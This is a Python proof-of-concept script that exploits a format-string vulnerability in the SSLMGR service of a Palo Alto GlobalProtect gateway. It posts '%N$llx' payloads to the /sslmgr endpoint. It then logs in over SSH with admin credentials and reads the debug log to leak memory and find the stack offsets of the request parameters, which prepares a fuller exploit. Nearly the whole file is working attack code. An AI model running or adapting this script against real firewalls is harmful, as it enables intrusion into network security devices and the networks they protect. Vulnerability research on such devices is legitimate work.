#!/usr/bin/python
#
# Utility script to leak memory from SSLMGR to find correct argument offsets
#
# Ex. python poc_leak.py -m 192.168.0.194 -g 192.168.0.196 -p admin
#

import requests
from pwn import *
import sys
import argparse

requests.packages.urllib3.disable_warnings()

# Constants
username = "admin"
prompt = username + "@PA-220>"
enable_dbg_cmd = "debug software logging-level set level dump service sslmgr"
idx_count = 0

# Simple class for storing the parameter data
class RequestParam:

	def __init__(self, name, val, index):
		self.name = name
		self.val = val
		self.index = index

	def __repr__(self):
		return self.name + ": " + self.index

def get_leak(sh, idx):

	global idx_count

	sh.sendline("tail mp-log sslmgr.log")

	# Receive the output
	sh.recvuntil(prompt)
	sh.recvuntil(prompt)

	# Get the leak data
	leak_data = sh.recvuntil(prompt)
	lines = leak_data.splitlines()
	#print lines
	for line in lines:
		if "SCEP cert request" in line:
			elements = line.split(",")
			for element in elements:
				if "email" in element:
					val = element.split(":")[1]
					if len(val) % 2 == 0: # If it's not even, it can't be ours
						decoded_str = val.strip().decode('hex')
						if len(decoded_str) > 6:
							decoded_str = decoded_str[:7] # Only checking first 7 because of weirdness
							for param_inst in param_list:
								if param_inst.val[:-1] == decoded_str:
									param_inst.index = str(idx)
									idx_count += 1

					# Print all 
					if debug:			
						print "Index: " + str(idx) + "\n" + val

					if idx_count == len(param_list):
						return True

					return False

# Enable debug
def enable_dbg(sh):
	sh.sendline(enable_dbg_cmd)

	# Receive the output
	for i in range(8):
		sh.recvuntil(prompt)

def make_request(ip, idx):

	url = "https://%s/sslmgr" % ip

	fmt_str_padding = " " * 20  # Add padding because of strlen
	data = "%s=" % param_list[0].name
	data += param_list[0].val
	data += "&%s=" % param_list[1].name
	data += param_list[1].val
	data += "&%s=" % param_list[2].name
	data += param_list[2].val
	data += "&user-email="
	data += "%" + str(idx) +"$llx" + fmt_str_padding
	data += "&%s=" % param_list[3].name
	data += param_list[3].val  

	r = requests.post(url, data=data, verify=False)
	out = r.text
	if "502 Bad Gateway" in out:
		print "[-] Error: Crashed. Aborting"
		return False

	return True

# Setup arguments
parser = argparse.ArgumentParser(description='Leak memory from SSLMGR to find argument offsets.')
parser.add_argument('-m', dest='ssh_ip', help='IP Address of the Palo Alto Management Interface.', required=True)
parser.add_argument('-p', dest='ssh_pw', help='SSH password for the admin user.', required=True)
parser.add_argument('-g', dest='global_protect_ip', help='IP Address of the Palo Alto Global Protect Gateway.', required=True)
parser.add_argument('-d', dest='dbg_flag', help='Print memory dump for all indexes.', action='store_true')
parser.set_defaults(dbg_flag=False)

# Parse out arguments
args = parser.parse_args()
ssh_ip = args.ssh_ip
global_protect_ip = args.global_protect_ip
password = args.ssh_pw

# Debug flag
debug = args.dbg_flag

# Setup request params
param_list = []
param_list.append( RequestParam('scep-profile-name','A'*8, ''))
param_list.append( RequestParam('appauthcookie','B'*8,''))
param_list.append( RequestParam('host-id','C'*8,''))
param_list.append( RequestParam('user','D'*8,''))

# Connect to ssh host
s =  ssh(host=ssh_ip, user=username, password=password)
sh = s.shell()
sh.recvuntil(prompt)

# Enable debug
enable_dbg(sh)

# Create progress logger
p = log.progress("Looking for parameter memory indexes.")

for i in range(1,300):

	# Write to log
	if make_request(global_protect_ip, i) == False:
		break

	# Print the leak
	if get_leak(sh, i):
		break

	p.status("Leaking... Index: %d" % i)

sh.close()
s.close()

p.success("Finished! :-)")

# Print indexes
print param_list
